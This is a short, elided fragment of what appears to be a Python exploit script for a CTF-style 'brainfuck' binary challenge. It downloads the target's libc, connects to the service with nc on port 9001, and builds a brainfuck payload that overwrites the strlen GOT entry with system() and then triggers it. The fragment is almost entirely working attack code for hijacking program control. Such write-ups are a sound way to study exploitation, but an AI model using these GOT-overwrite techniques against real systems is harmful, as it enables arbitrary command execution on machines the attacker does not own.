...
if libc_file not in os.listdir():
    sh.download(f"/lib/i386-linux-gnu/{libc_file}")
elf = ELF(libc_file)
...
# bf = sh.run("./brainfuck | tee /tmp/k280_e2_out")
bf = sh.run("nc 0 9001")
...
payload1 += ",>,>,>,"       # replace strlen GOT entry with system()                    -- payload2, part3
payload1 += "."             # trigger
